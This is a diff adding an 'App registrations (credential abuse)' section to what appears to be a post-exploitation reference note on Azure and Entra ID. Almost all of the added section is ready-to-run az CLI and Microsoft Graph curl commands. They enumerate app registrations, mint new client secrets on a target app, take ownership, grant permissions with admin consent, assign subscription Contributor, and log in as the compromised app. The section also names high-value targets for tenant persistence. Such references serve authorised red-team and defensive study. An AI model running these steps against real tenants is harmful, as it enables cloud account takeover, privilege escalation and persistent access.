@@ -4,7 +4,7 @@ type: technique
 tags: [active-directory, azure, cloud, iam, privilege-escalation, reference-import]
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
+date_updated: 2026-09-10
 sources: [InternalAllTheThings]
 ---
 
@@ -265,6 +265,57 @@ ObjectId                             AppId                                Displa
 0cbef08e-a4b5-4dd9-865e-8f521c1c5fb4 0469d4cd-df37-4d93-8a61-f8c75b809164 Microsoft Policy Administration Service
 0ea80ff0-a9ea-43b6-b876-d5989efd8228 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics</dev:code>
 ```
+
+## App registrations (credential abuse)
+
+The exploit half of SP work: an identity with rights over an app registration
+(`Application.ReadWrite.All`, Ownership, or a Graph app-role) can mint credentials
+and grant itself roles. Enumerate first, then abuse:
+
+```sh
+# Enumerate: apps, their owners, and any existing credentials
+az ad app list --query "[].{id:appId, obj:id, name:displayName}" -o table
+az ad app owner list --id <app-object-id> -o table
+az ad app credential list --id <app-object-id>          # keyIds + added-by
+az ad sp owner list --id <sp-object-id> -o table
+```
+
+With control of (or rights over) an app registration:
+
+```sh
+# 1. Mint a NEW client secret on the target app (no need to know the old one)
+az ad sp credential reset --id <app-id> --append --years 2   # prints the new password
+# Graph equivalent (works with an app-only token holding Application.ReadWrite.All):
+curl -s -X POST "https://graph.microsoft.com/v1.0/applications/<object-id>/addPassword" \
+  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+  -d '{"passwordCredential":{"displayName":"backup-key"}}'    # -> secretText
+
+# 2. Take ownership (owners manage credentials + permissions silently)
+curl -s -X POST "https://graph.microsoft.com/v1.0/applications/<object-id>/owners/\$ref" \
+  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<your-object-id>"}'
+
+# 3. Grant it application permissions (needs admin-consent rights) then consent
+az ad app permission add --id <app-id> --api <resource-app-id> --api-permissions <perm-id>=Role
+az ad app permission admin-consent --id <app-id>
+
+# 4. Azure RBAC side: point the service principal at subscription resources
+az role assignment create --assignee <app-id> --role Contributor --scope /subscriptions/<sub-id>
+```
+
+Auth as the compromised app (client-credentials flow), then re-enumerate Graph with
+the new, more privileged token:
+
+```sh
+az login --service-principal -u <app-id> -p "<new-secret>" --tenant <tenant-id>
+curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
+  -d "grant_type=client_credentials&client_id=<app-id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default"
+```
+
+High-value targets: apps that already hold `Mail.ReadWrite`, `RoleManagement.ReadWrite.Directory`
+(grant yourself an Entra role), or a Microsoft Graph `Application.ReadWrite.All` chain
+(recursive app control = tenant persistence). Privileged apps assigned Entra directory
+roles show under `az ad sp list --show-mine` + `Get-AzureADDirectoryRole | %{Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId}`.
 
 ## Other
 
